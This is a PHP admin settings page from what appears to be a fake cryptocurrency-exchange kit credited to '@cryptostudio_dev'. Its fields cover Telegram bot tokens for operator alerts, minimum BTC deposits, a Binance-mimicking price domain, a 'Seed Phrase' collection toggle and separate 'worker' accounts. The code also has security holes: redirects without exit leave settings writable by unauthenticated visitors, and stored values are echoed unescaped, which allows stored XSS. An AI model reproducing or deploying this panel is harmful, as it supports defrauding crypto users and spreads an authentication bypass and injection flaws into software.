<?php
session_start();
include "_config.php";

if(auth($_SESSION['uuid']) == 0){
    header("Location: /");
}elseif(auth($_SESSION['uuid']) == 2){
    header("Location: /admin/worker_index");
}elseif(auth($_SESSION['uuid']) == 1){
    // By @cryptostudio_dev
}else{
    header("Location: https://t.me/cryptostudio_dev");
}

if(isset($_POST['name'])){
    saveSettings('name', $_POST['name']);
}
if(isset($_POST['domain'])){
    saveSettings('domain', $_POST['domain']);
}
if(isset($_POST['tg_id'])){
    saveSettings('tg_admin', $_POST['tg_id']);
}
if(isset($_POST['ts_id'])){
    saveSettings('ts', $_POST['ts_id']);
}
if(isset($_POST['tg_bot'])){
    saveSettings('tg_bot', $_POST['tg_bot']);
}
if(isset($_POST['chat_id'])){
    saveSettings('chat_id', $_POST['chat_id']);
}
if(isset($_POST['trade_fee'])){
    saveSettings('trade_fee', $_POST['trade_fee']);
}
if(isset($_POST['min_dep_btc'])){
    saveSettings('min_dep_btc', $_POST['min_dep_btc']);
}
if(isset($_POST['domain_cur'])){
    saveSettings('domain_cur', $_POST['domain_cur']);
}
if(isset($_POST['vfs'])){
    saveSettings('blockchain_sync', $_POST['vfs']);
}

$vfs_info = getSettings('blockchain_sync');
$vfs_error = "";
$vfs_trans = "";
if ($vfs_info == 0) {
    $vfs_trans = 'checked=""';
} elseif ($vfs_info == 1) {
    $vfs_error = 'checked=""';
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" type="image/png" sizes="16x16" href="../plugins/images/favicon.png">
    <title>AdminPanel | Dev @cryptostudio_dev</title>
    <!-- Bootstrap Core CSS -->
    <link href="bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Menu CSS -->
    <link href="../plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css" rel="stylesheet">
    <!-- chartist CSS -->
    <link href="../plugins/bower_components/chartist-js/dist/chartist.min.css" rel="stylesheet">
    <link href="../plugins/bower_components/chartist-plugin-tooltip-master/dist/chartist-plugin-tooltip.css" rel="stylesheet">
    <!-- Vector CSS -->
    <link href="../plugins/bower_components/vectormap/jquery-jvectormap-2.0.2.css" rel="stylesheet" />
    <!-- animation CSS -->
    <link href="css/animate.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="css/style.css" rel="stylesheet">
    <!-- color CSS -->
    <link href="css/colors/blue-dark.css" id="theme" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>

<body class="fix-header">
<!-- ============================================================== -->
<!-- Preloader -->
<!-- ============================================================== -->
<div class="preloader">
    <svg class="circular" viewBox="25 25 50 50">
        <circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
    </svg>
</div>
<!-- ============================================================== -->
<!-- Wrapper -->
<!-- ============================================================== -->
<div id="wrapper">
    <!-- ============================================================== -->
    <!-- Topbar header - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- Left Sidebar - style you can find in sidebar.scss  -->
    <!-- ============================================================== -->
    <? include "menu_cfg.php"; ?>
    <!-- ============================================================== -->
    <!-- End Left Sidebar -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- Page Content -->
    <!-- ============================================================== -->
    <div id="page-wrapper">
        <div class="container-fluid" style="margin-top: -70px;">
            <div class="row bg-title">
                <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
                    <h4 class="page-title">AdminPanel</h4>
                </div>
                <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
                    <ol class="breadcrumb">
                        <li><a href="/">Index</a></li>
                        <li class="active">Settings site</li>
                    </ol>
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- ============================================================== -->
            <!-- Other sales widgets -->
            <!-- ============================================================== -->
            <!-- ============================================================== -->
            <!-- Demo table -->
            <!-- ============================================================== -->
            <div class="row">
                <div class="white-box">
                    <h3 class="box-title m-b-0">Settings site</h3>
                    <form class="form-horizontal" method="post">
                        <!--
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">Guard DataBase*</label>
                            <div class="col-sm-9">
                                <p class="text-muted m-b-20"><a href="https://<?=$_SERVER["SERVER_NAME"];?>/db_cryptostudio/guard">Guard restart DB</a> - Guard DB</p>
                            </div>
                        </div>
                        !-->
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">Name Site*</label>
                            <div class="col-sm-9">
                                <input type="text" class="form-control" name="name" id="inputEmail3" placeholder="Name Site" value="<?=getSettings('name');?>"> </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">Domain*</label>
                            <div class="col-sm-9">
                                <input type="text" class="form-control" name="domain" id="inputEmail3" placeholder="Domain" value="<?=getSettings('domain');?>"> </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">Domain currenty*</label>
                            <div class="col-sm-9">
                                <input type="text" class="form-control" name="domain_cur" id="inputEmail3" placeholder="Domain currenty" value="<?=getSettings('domain_cur');?>">

                                <p class="text-muted m-b-20">Type domains:</p>
                                <p class="text-muted m-b-20"><code>binance.com</code></p>
                                <p class="text-muted m-b-20"><code>binance.us</code></p>
                                <p class="text-muted m-b-20"><code><?=$_SERVER["SERVER_NAME"];?></code> - works via cron</p>
                                <p class="text-muted m-b-20">Cron domain: <code>https://<?=$_SERVER["SERVER_NAME"];?>/api/v3/ticker/online</code></p>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">TG ID*</label>
                            <div class="col-sm-9">
                                <input type="text" class="form-control" name="tg_id" id="inputEmail3" placeholder="Tg id" value="<?=getSettings('tg_admin');?>">
                                <p class="text-muted m-b-20">Chat Id can be obtained in the bot: <a href="https://t.me/getmyid_bot">BOT</a></p>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">TG Login (is bot)*</label>
                            <div class="col-sm-9">
                                <input type="text" class="form-control" name="ts_id" id="inputEmail3" placeholder="Tg id" value="<?=getSettings('ts');?>">
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">TG BOT TOKEN*</label>
                            <div class="col-sm-9">
                                <input type="text" class="form-control" name="tg_bot" id="inputEmail3" placeholder="Tg Bot token" value="<?=getSettings('tg_bot');?>">
                                <p class="text-muted m-b-20">You can get a bot token here: <a href="https://t.me/BotFather">BOT</a></p>
                                <p class="text-muted m-b-20">Connect bot's: <a href="https://api.telegram.org/bot<?=getSettings('tg_bot');?>/setWebhook?url=https://<?=$_SERVER["SERVER_NAME"];?>/cryptostudio_bot/cryptostudio_bot.php">Connect bot</a></p>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">SmartChat ID*</label>
                            <div class="col-sm-9">
                                <input type="text" class="form-control" name="chat_id" id="inputEmail3" placeholder="SmartChat ID" value="<?=getSettings('chat_id');?>">
                                <p class="text-muted m-b-20">The chat token can be obtained here: <a href="https://www.smartsupp.com/">SITE</a></p>
                            </div>
                        </div>

                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">MinDepBTC*</label>
                            <div class="col-sm-9">
                                <input type="text" class="form-control" name="min_dep_btc" id="inputEmail3" placeholder="min_dep_btc" value="<?=getSettings('min_dep_btc');?>"> </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">TradeFee*</label>
                            <div class="col-sm-9">
                                <input type="text" class="form-control" name="trade_fee" id="inputEmail3" placeholder="trade_fee" value="<?=getSettings('trade_fee');?>"> </div>
                        </div>

                        <div class="form-group">
                            <label for="inputPassword4" class="col-sm-3 control-label">Seed Phrase</label>
                            <div class="col-md-9">
                                <div class="radio-list">
                                    <label class="radio-inline">
                                        <input type="radio" name="vfs" value="1" <?=$vfs_error?>> Active </label>
                                    <label class="radio-inline">
                                        <input type="radio" name="vfs" value="0" <?=$vfs_trans?>> No Active </label>
                                </div>
                            </div>
                        </div>

                        <div class="form-group m-b-0">
                            <div class="col-sm-offset-3 col-sm-9">
                                <button type="submit" class="btn btn-info waves-effect waves-light m-t-10">Save</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>

            <!-- ============================================================== -->
            <!-- Right sidebar -->
            <!-- ============================================================== -->
            <!-- .right-sidebar -->
            <!-- ============================================================== -->
            <!-- End Right sidebar -->
            <!-- ============================================================== -->
        </div>
        <!-- /.container-fluid -->
        <footer class="footer text-center"> 2023 &copy; AdminPanel By @cryptostudio_dev </footer>
    </div>
    <!-- /#page-wrapper -->
</div>
<!-- /#wrapper -->
<!-- jQuery -->
<script src="../plugins/bower_components/jquery/dist/jquery.min.js"></script>
<!-- Bootstrap Core JavaScript -->
<script src="bootstrap/dist/js/bootstrap.min.js"></script>
<!-- Menu Plugin JavaScript -->
<script src="../plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js"></script>
<!--Counter js -->
<script src="../plugins/bower_components/waypoints/lib/jquery.waypoints.js"></script>
<script src="../plugins/bower_components/counterup/jquery.counterup.min.js"></script>
<!--slimscroll JavaScript -->
<script src="js/jquery.slimscroll.js"></script>
<!--Wave Effects -->
<script src="js/waves.js"></script>
<!-- Vector map JavaScript -->
<script src="../plugins/bower_components/vectormap/jquery-jvectormap-2.0.2.min.js"></script>
<script src="../plugins/bower_components/vectormap/jquery-jvectormap-world-mill-en.js"></script>
<script src="../plugins/bower_components/vectormap/jquery-jvectormap-in-mill.js"></script>
<script src="../plugins/bower_components/vectormap/jquery-jvectormap-us-aea-en.js"></script>
<!-- chartist chart -->
<script src="../plugins/bower_components/chartist-js/dist/chartist.min.js"></script>
<script src="../plugins/bower_components/chartist-plugin-tooltip-master/dist/chartist-plugin-tooltip.min.js"></script>
<!-- sparkline chart JavaScript -->
<script src="../plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js"></script>
<script src="../plugins/bower_components/jquery-sparkline/jquery.charts-sparkline.js"></script>
<!-- Custom Theme JavaScript -->
<script src="js/custom.min.js"></script>
<script src="js/dashboard3.js"></script>
<!--Style Switcher -->
<script src="../plugins/bower_components/styleswitcher/jQuery.style.switcher.js"></script>
</body>

</html>
